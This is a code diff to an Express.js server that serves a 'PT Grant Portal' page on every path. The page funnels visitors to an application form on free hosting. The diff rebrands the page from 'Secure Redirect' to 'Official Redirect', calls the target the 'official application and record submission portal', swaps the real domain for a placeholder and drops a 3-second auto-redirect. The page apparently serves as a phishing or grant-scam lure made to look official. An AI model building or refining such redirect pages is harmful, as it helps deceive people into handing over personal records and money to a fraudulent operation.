@@ -2,8 +2,8 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ---> PASTE YOUR INFINITYFREE LINK HERE <---
-const INFINITYFREE_URL = 'contact-application-form.42web.io';
+// ---> PUT YOUR EXACT INFINITYFREE LINK HERE <---
+const INFINITYFREE_URL = 'http://YOUR-INFINITYFREE-DOMAIN.infinityfreeapp.com';
 
 app.get('*', (req, res) => {
     res.send(`
@@ -12,7 +12,7 @@ app.get('*', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>PT Grant Portal | Secure Redirect</title>
+        <title>PT Grant Portal | Official Redirect</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
         <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -26,37 +26,18 @@ app.get('*', (req, res) => {
             
             <h1 class="text-2xl font-bold text-white mb-2">PT Grant Portal</h1>
             <p class="text-slate-400 text-sm mb-8 leading-relaxed">
-                You are being redirected to our secure, permanent application system. Click the button below to proceed instantly.
+                Click the button below to access the official application and record submission portal.
             </p>
             
-            <a href="${INFINITYFREE_URL}" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-blue-600/30 transition block mb-5 transform hover:-translate-y-0.5">
-                Proceed to Application Portal <i class="fas fa-arrow-right ml-2"></i>
+            <a href="${INFINITYFREE_URL}" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-blue-600/30 transition block transform hover:-translate-y-0.5">
+                Access Application Portal <i class="fas fa-arrow-right ml-2"></i>
             </a>
-            
-            <p class="text-xs text-slate-500 font-mono">
-                Auto-redirecting in <span id="countdown" class="text-blue-400 font-bold">3</span> seconds...
-            </p>
         </div>
-
-        <script>
-            let seconds = 3;
-            const countdownEl = document.getElementById('countdown');
-            const targetUrl = "${INFINITYFREE_URL}";
-            
-            const timer = setInterval(() => {
-                seconds--;
-                countdownEl.innerText = seconds;
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    window.location.href = targetUrl;
-                }
-            }, 1000);
-        </script>
     </body>
     </html>
     `);
 });
 
 app.listen(PORT, () => {
-    console.log(`Redirect server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
